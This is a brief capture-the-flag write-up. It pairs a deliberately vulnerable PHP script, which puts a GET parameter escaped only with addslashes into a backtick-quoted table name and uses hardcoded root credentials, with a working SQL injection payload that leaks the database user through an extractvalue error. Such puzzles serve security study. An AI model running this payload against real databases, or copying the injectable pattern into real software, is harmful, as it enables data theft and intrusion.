# Challenge
```php 
<?php
$link = mysqli_connect('localhost', 'root', 'root');
mysqli_select_db($link, 'code');

$table = addslashes($_GET['table']);
$sql = "UPDATE `{$table}` 
        SET `username`='admin'
        WHERE id=1";
if(!mysqli_query($link, $sql)) {
    echo(mysqli_error($link));
}
mysqli_close($link);
```



# Solution

payload

```mysql
md5` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username
```

# Refference

+ [关于一个sql注入注入题目的思考](https://paper.seebug.org/216/)

